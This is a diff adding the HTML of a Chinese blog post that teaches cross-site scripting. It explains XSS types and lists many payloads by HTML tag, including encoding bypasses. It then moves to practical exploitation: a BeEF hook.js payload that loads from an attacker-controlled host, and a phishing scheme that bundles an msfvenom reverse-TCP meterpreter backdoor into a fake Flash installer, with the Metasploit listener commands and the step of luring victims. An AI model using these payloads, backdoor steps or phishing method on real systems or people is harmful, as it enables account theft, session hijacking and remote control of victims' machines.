@@ -1,0 +1,738 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="XSS跨站脚本请求伪造攻击XSS原理    &#x2F;    危害   &#x2F;   种类    &#x2F;  利用 （实战）  &#x2F;   waf绕过     sql注入—sql代码 XSS—html代码 用户–》sql注入–》数据库–》服务器 用户–》XSS–》用户      XSS+CSRF+core(同源) 1、原理指攻击者利用网站程序对用户输入过滤不足，输入可以显示在页面上">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CSQ&amp;个人博客">
+<meta property="og:url" content="http://example.com/2023/05/03/xss/index.html">
+<meta property="og:site_name" content="CSQ&amp;个人博客">
+<meta property="og:description" content="XSS跨站脚本请求伪造攻击XSS原理    &#x2F;    危害   &#x2F;   种类    &#x2F;  利用 （实战）  &#x2F;   waf绕过     sql注入—sql代码 XSS—html代码 用户–》sql注入–》数据库–》服务器 用户–》XSS–》用户      XSS+CSRF+core(同源) 1、原理指攻击者利用网站程序对用户输入过滤不足，输入可以显示在页面上">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/images/image-20230411154032368.png">
+<meta property="og:image" content="http://example.com/images/image-20221203193224897-16831002517833.png">
+<meta property="og:image" content="http://example.com/images/image-20221219092453905.png">
+<meta property="og:image" content="http://example.com/images/image-20230412003256979.png">
+<meta property="article:published_time" content="2023-05-03T07:48:11.212Z">
+<meta property="article:modified_time" content="2023-05-03T07:52:32.357Z">
+<meta property="article:author" content="CSQ">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/image-20230411154032368.png">
+
+<link rel="canonical" href="http://example.com/2023/05/03/xss/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title> | CSQ&个人博客</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">CSQ&个人博客</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/05/03/xss/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="CSQ">
+      <meta itemprop="description" content="学无止境">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="CSQ&个人博客">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2023-05-03 15:48:11 / 修改时间：15:52:32" itemprop="dateCreated datePublished" datetime="2023-05-03T15:48:11+08:00">2023-05-03</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="XSS跨站脚本请求伪造攻击"><a href="#XSS跨站脚本请求伪造攻击" class="headerlink" title="XSS跨站脚本请求伪造攻击"></a>XSS跨站脚本请求伪造攻击</h1><p>XSS原理    &#x2F;    危害   &#x2F;   种类    &#x2F;  利用 （实战）  &#x2F;   waf绕过    </p>
+<p>sql注入—sql代码</p>
+<p>XSS—html代码</p>
+<p>用户–》sql注入–》数据库–》服务器</p>
+<p>用户–》XSS–》用户      XSS+CSRF+core(同源)</p>
+<h2 id="1、原理"><a href="#1、原理" class="headerlink" title="1、原理"></a>1、原理</h2><p>指攻击者利用网站程序对用户输入过滤不足，输入可以显示在页面上对其他用户造成影响的HTML代码，</p>
+<p>从而盗取用户资料、利用用户身份进行某种动作或者对访问者进行病毒侵害的一种攻击方式。通过在用户端注入恶意的可执行脚本，若服务器对用户的输入不进行处理或处理不严，则浏览器就会直接执行用户注入的脚本。</p>
+<p>-数据交互的地方</p>
+<p>​	get、post、headers</p>
+<p>​	反馈与浏览</p>
+<p>​	富文本编辑器</p>
+<p>​	各类标签插入和自定义			</p>
+<p>-数据输出的地方</p>
+<p>​	用户资料</p>
+<p>​	关键词、标签、说明</p>
+<p>​	文件上传(XSS)</p>
+<h2 id="2、危害"><a href="#2、危害" class="headerlink" title="2、危害"></a>2、危害</h2><ol>
+<li><p>网络钓鱼，包括获取各类用户账号；</p>
+</li>
+<li><p>窃取用户cookies资料，从而获取用户隐私信息，或利用用户身份对网站执行操作；</p>
+</li>
+<li><p>劫持用户（浏览器）会话，从而执行任意操作，例如非法转账、发表日志、邮件等；</p>
+</li>
+<li><p>强制弹出广告页面、刷流量等；</p>
+</li>
+<li><p>网页挂马；</p>
+</li>
+<li><p>进行恶意操作，如任意篡改页面信息、删除文章等； XSS+CSRF</p>
+</li>
+<li><p>进行大量的客户端攻击，如ddos等；</p>
+</li>
+<li><p>获取客户端信息，如用户的浏览历史、真实ip、开放端口等；</p>
+</li>
+<li><p>控制受害者机器向其他网站发起攻击；</p>
+</li>
+<li><p>结合其他漏洞，如csrf,实施进一步危害；</p>
+</li>
+<li><p>提升用户权限，包括进一步渗透网站；</p>
+</li>
+<li><p>传播跨站脚本蠕虫等</p>
+</li>
+</ol>
+<h2 id="3、分类"><a href="#3、分类" class="headerlink" title="3、分类"></a>3、分类</h2><h3 id="3-1、反射型（非持久型）"><a href="#3-1、反射型（非持久型）" class="headerlink" title="3.1、反射型（非持久型）"></a>3.1、反射型（非持久型）</h3><p>反射型XSS也叫非持久型XSS，最常见的是Payload是构造在网址的某个GET参数的值里。 比如这样的：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.xx.com/company/search.html?key_pro=&quot;&gt;&lt;script&gt;confirm(1501)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="3-2、存储型（持久型）"><a href="#3-2、存储型（持久型）" class="headerlink" title="3.2、存储型（持久型）"></a>3.2、存储型（持久型）</h3><p>存储型XSS也叫持久型XSS，存储的意思就是Payload是有经过存储的，当一个页面存在存储型XSS的时候，XSS注入成功后，那么每次访问该页面都将触发XSS，典型的例子是：</p>
+<p>如留言板</p>
+<ol>
+<li>插入留言&#x3D;&gt;内容存储到数据库</li>
+<li>查看留言&#x3D;&gt;内容从数据库提取出来</li>
+<li>内容在页面显示</li>
+</ol>
+<p>如果这里存在XSS，Payload可以通过留言内容提交，然后显示在页面的时候可以生效，那么就是典型的存储型XSS。</p>
+<p><a target="_blank" rel="noopener" href="http://localhost:88/xssplatf/gbook.php">http://localhost:88/xssplatf/gbook.php</a></p>
+<p><a target="_blank" rel="noopener" href="http://localhost/dami/admin.php?s=/Public/login">http://localhost/dami/admin.php?s=/Public/login</a></p>
+<h3 id="3-3、DOM型"><a href="#3-3、DOM型" class="headerlink" title="3.3、DOM型"></a>3.3、DOM型</h3><p>反射型和存储型都是通过后台输出，DOM xss是纯前台的漏洞</p>
+<p>DOM XSS的XSS代码并不需要服务器解析响应的直接参与，触发XSS靠的就是浏览器端的DOM解析，可以认为完全是客户端的事情，无法通过WAF防护。</p>
+<p>二、哪里有DOM XSS<br>1、js中，从url中获得参数并将其作为js执行<br>检查eval(), execScript(), setInterval(), setTimeout()，Function()参数是否通过URL可控。<br>这些关键字中，它们的参数作为js&#x2F;html的代码进行执行，即可以动态执行代码。<br>2、如果输出的来源是用户，则有XSS风险<br>innerHTML、document.write</p>
+<p><img src="/../images/image-20230411154032368.png" alt="image-20230411154032368"></p>
+<h3 id="3-4、UXSS（通用型xss）"><a href="#3-4、UXSS（通用型xss）" class="headerlink" title="3.4、UXSS（通用型xss）"></a>3.4、UXSS（通用型xss）</h3><p>是利用<strong>浏览器或者浏览器扩展漏洞</strong>来制造产生XSS代码的一种攻击类型。</p>
+<p>挖掘方法就是不断测试浏览器的各种功能</p>
+<p>ABC.html</p>
+<script>alert(1)</script>   //中文
+
+<script>alert(1)</script>   //英文
+
+
+
+
+
+<p>(比如一个浏览器访问网页没有触发XSS漏洞，使用翻译功能时页面却会产生XSS漏洞)</p>
+<h3 id="3-5、PDF-XSS"><a href="#3-5、PDF-XSS" class="headerlink" title="3.5、PDF XSS"></a>3.5、PDF XSS</h3><p>PDF–&gt;js</p>
+<p>app.alert(1);</p>
+<p><img src="/../images/image-20221203193224897-16831002517833.png" alt="image-20221203193224897"></p>
+<p><img src="/../images/image-20221219092453905.png" alt="image-20221219092453905"></p>
+<h2 id="4、-xss-常见标签语句"><a href="#4、-xss-常见标签语句" class="headerlink" title="4、 xss 常见标签语句"></a>4、 xss 常见标签语句</h2><p>html中的事件：<a target="_blank" rel="noopener" href="https://www.runoob.com/tags/ref-eventattributes.html">https://www.runoob.com/tags/ref-eventattributes.html</a></p>
+<h3 id="0x01-lt-a-gt-标签"><a href="#0x01-lt-a-gt-标签" class="headerlink" title="0x01. **&lt; a&gt;**标签"></a>0x01. **&lt; a&gt;**标签</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;javascript:alert(1)&quot;&gt;test&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;http://baidu.com&quot; onfocus=&quot;alert(&#x27;xss&#x27;);&quot; autofocus=&quot;&quot;&gt;xss&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;x&quot; onclick=eval(&quot;alert(&#x27;xss&#x27;);&quot;)&gt;xss&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;x&quot; onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;x&quot; onmouseout=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x02-lt-img-gt-标签"><a href="#0x02-lt-img-gt-标签" class="headerlink" title="0x02. &lt; img&gt;标签"></a>0x02. &lt; img&gt;标签</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=“&#123;payload&#125;” onerror=&quot;alert(1)&quot;&gt;</span><br><span class="line">&lt;img src=x onerror=eval(&quot;alert(1)&quot;)&gt;</span><br><span class="line">&lt;img src=1 onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;</span><br><span class="line">&lt;img src=1 onmouseout=&quot;alert(&#x27;xss&#x27;);&quot;&gt;</span><br><span class="line">&lt;img src=1 onclick=&quot;alert(&#x27;xss&#x27;);&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x03-lt-iframe-gt-标签"><a href="#0x03-lt-iframe-gt-标签" class="headerlink" title="0x03. &lt; iframe&gt;标签"></a>0x03. &lt; iframe&gt;标签</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=&quot;javascript:alert(1)&quot;&gt;test&lt;/iframe&gt;</span><br><span class="line">&lt;iframe onload=&quot;alert(document.cookie)&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;iframe onload=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;iframe onload=&quot;base64,YWxlcnQoJ3hzcycpOw==&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;iframe onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x04-lt-audio-gt-标签"><a href="#0x04-lt-audio-gt-标签" class="headerlink" title="0x04. &lt; audio&gt; 标签"></a>0x04. &lt; audio&gt; 标签</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;audio src=1 onerror=alert(1)&gt;</span><br><span class="line">&lt;audio&gt;&lt;source src=&quot;x&quot; onerror=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/audio&gt;</span><br><span class="line">&lt;audio controls onfocus=eval(&quot;alert(&#x27;xss&#x27;);&quot;) autofocus=&quot;&quot;&gt;&lt;/audio&gt;</span><br><span class="line">&lt;audio controls onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;source src=&quot;x&quot;&gt;&lt;/audio&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="0x05-lt-video-gt-标签"><a href="#0x05-lt-video-gt-标签" class="headerlink" title="0x05. &lt; video&gt;标签"></a>0x05. &lt; video&gt;标签</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;video src=x onerror=alert(1)&gt;</span><br><span class="line">&lt;video&gt;&lt;source onerror=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/video&gt;</span><br><span class="line">&lt;video controls onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/video&gt;</span><br><span class="line">&lt;video controls onfocus=&quot;alert(&#x27;xss&#x27;);&quot; autofocus=&quot;&quot;&gt;&lt;/video&gt;</span><br><span class="line">&lt;video controls onclick=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/video&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x06-lt-svg-gt-标签"><a href="#0x06-lt-svg-gt-标签" class="headerlink" title="0x06. &lt; svg&gt; 标签"></a>0x06. &lt; svg&gt; 标签</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg onload=javascript:alert(1)&gt;</span><br><span class="line">&lt;svg onload=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/svg&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x07-lt-button-gt-标签"><a href="#0x07-lt-button-gt-标签" class="headerlink" title="0x07. &lt; button&gt; 标签"></a>0x07. &lt; button&gt; 标签</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;button onclick=alert(1)&gt;</span><br><span class="line">&lt;button onfocus=&quot;alert(&#x27;xss&#x27;);&quot; autofocus=&quot;&quot;&gt;xss&lt;/button&gt;</span><br><span class="line">&lt;button onclick=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/button&gt;</span><br><span class="line">&lt;button onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/button&gt;</span><br><span class="line">&lt;button onmouseout=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/button&gt;</span><br><span class="line">&lt;button onmouseup=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/button&gt;</span><br><span class="line">&lt;button onmousedown=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/button&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x08-lt-div-gt-标签"><a href="#0x08-lt-div-gt-标签" class="headerlink" title="0x08. &lt; div&gt;标签"></a>0x08. &lt; div&gt;标签</h3><p>这个需要借助url编码来实现绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">原代码：</span><br><span class="line">&lt;div onmouseover=&#x27;alert(1)&#x27;&gt;DIV&lt;/div&gt;</span><br><span class="line">经过url编码：</span><br><span class="line">&lt;div onmouseover%3d&#x27;alert%26lpar%3b1%26rpar%3b&#x27;&gt;DIV&lt;%2fdiv&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x09-lt-object-gt-标签"><a href="#0x09-lt-object-gt-标签" class="headerlink" title="0x09. &lt; object&gt;标签"></a>0x09. &lt; object&gt;标签</h3><p>这个需要借助 data 伪协议和 base64 编码来实现绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;object data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=&quot;&gt;&lt;/object&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x10-lt-script-gt-标签"><a href="#0x10-lt-script-gt-标签" class="headerlink" title="0x10. &lt; script&gt; 标签"></a>0x10. &lt; script&gt; 标签</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;alert(123)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x11-lt-p-gt-标签"><a href="#0x11-lt-p-gt-标签" class="headerlink" title="0x11. &lt; p&gt; 标签"></a>0x11. &lt; p&gt; 标签</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;p onclick=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/p&gt;</span><br><span class="line">&lt;p onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/p&gt;</span><br><span class="line">&lt;p onmouseout=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/p&gt;</span><br><span class="line">&lt;p onmouseup=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/p&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x12-lt-input-gt-标签"><a href="#0x12-lt-input-gt-标签" class="headerlink" title="0x12. &lt; input&gt; 标签"></a>0x12. &lt; input&gt; 标签</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;input onclick=&quot;alert(&#x27;xss&#x27;);&quot;&gt;</span><br><span class="line">&lt;input onfocus=&quot;alert(&#x27;xss&#x27;);&quot;&gt;</span><br><span class="line">&lt;input onfocus=&quot;alert(&#x27;xss&#x27;);&quot; autofocus=&quot;&quot;&gt;</span><br><span class="line">&lt;input onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; onkeydown=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/input&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; onkeypress=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/input&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; onkeydown=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/input&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x13-lt-details-gt-标签"><a href="#0x13-lt-details-gt-标签" class="headerlink" title="0x13. &lt; details&gt;标签"></a>0x13. &lt; details&gt;标签</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;details ontoggle=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/details&gt;</span><br><span class="line">&lt;details ontoggle=&quot;alert(&#x27;xss&#x27;);&quot; open=&quot;&quot;&gt;&lt;/details&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x14-lt-select-gt-标签"><a href="#0x14-lt-select-gt-标签" class="headerlink" title="0x14. &lt; select&gt; 标签"></a>0x14. &lt; select&gt; 标签</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;select onfocus=&quot;alert(&#x27;xss&#x27;);&quot; autofocus&gt;&lt;/select&gt;</span><br><span class="line">&lt;select onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/select&gt;</span><br><span class="line">&lt;select onclick=eval(&quot;alert(&#x27;xss&#x27;);&quot;)&gt;&lt;/select&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x15-lt-form-gt-标签"><a href="#0x15-lt-form-gt-标签" class="headerlink" title="0x15. &lt; form&gt; 标签"></a>0x15. &lt; form&gt; 标签</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;form method=&quot;x&quot; action=&quot;x&quot; onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;input type=submit&gt;&lt;/form&gt; </span><br><span class="line">&lt;form method=&quot;x&quot; action=&quot;x&quot; onmouseout=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;input type=submit&gt;&lt;/form&gt; </span><br><span class="line">&lt;form method=&quot;x&quot; action=&quot;x&quot; onmouseup=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;input type=submit&gt;&lt;/form&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="0x16-lt-body-gt-标签"><a href="#0x16-lt-body-gt-标签" class="headerlink" title="0x16. &lt; body&gt; 标签"></a>0x16. &lt; body&gt; 标签</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body onload=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/body&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h2 id="5-XSS实战利用"><a href="#5-XSS实战利用" class="headerlink" title="5.XSS实战利用"></a>5.XSS实战利用</h2><h3 id="5-1、XSS利用平台"><a href="#5-1、XSS利用平台" class="headerlink" title="5.1、XSS利用平台"></a>5.1、XSS利用平台</h3><p>XSS平台</p>
+<p><a target="_blank" rel="noopener" href="https://xss.pt/">https://xss.pt/</a></p>
+<p>Beef-XSS</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/beefproject/beef">https://github.com/beefproject/beef</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">docker run --rm -p 3000:3000 janes/beef &amp;</span><br><span class="line"></span><br><span class="line">http://&lt;ip&gt;:3000/ui/authentication</span><br><span class="line"></span><br><span class="line">账户/密码：beef/beef</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload:</span><br><span class="line">&lt;script src=&#x27;http://192.168.156.146:3000/hook.js&#x27;&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20230412003256979.png" alt="image-20230412003256979"></p>
+<h3 id="5-2、-后台植入Cookie-amp-表单劫持"><a href="#5-2、-后台植入Cookie-amp-表单劫持" class="headerlink" title="5.2、**后台植入Cookie&amp;表单劫持  **"></a>5.2、**后台植入Cookie&amp;表单劫持  **</h3><p>​												—<strong>权限维持</strong></p>
+<p>利用条件：XSS存储型控制对方网站源码</p>
+<h3 id="5-3、Flash钓鱼配合木马捆绑上线"><a href="#5-3、Flash钓鱼配合木马捆绑上线" class="headerlink" title="5.3、Flash钓鱼配合木马捆绑上线"></a><strong>5.3、Flash钓鱼配合木马捆绑上线</strong></h3><p>​												—配合XSS钓鱼</p>
+<p>-条件：beef上线受控后或直接钓鱼</p>
+<p>1、生成后门</p>
+<p>msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;xx.xx.xx.xx LPORT&#x3D;6666 -f exe &gt; flash.exe</p>
+<p>2、下载官方文件-保证安装正常</p>
+<p>3、压缩捆绑文件-解压提取运行</p>
+<p>4、MSF配置监听状态</p>
+<p>use exploit&#x2F;multi&#x2F;handler</p>
+<p>set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</p>
+<p>set lhost 0.0.0.0</p>
+<p>set lport 6666</p>
+<p>run</p>
+<p>5、诱使受害者访问URL-语言要适当</p>
+<h3 id="5-4、XSS靶场"><a href="#5-4、XSS靶场" class="headerlink" title="5.4、XSS靶场"></a>5.4、XSS靶场</h3><p><a target="_blank" rel="noopener" href="http://43.138.215.2/xssGo/">http://43.138.215.2/xssGo/</a></p>
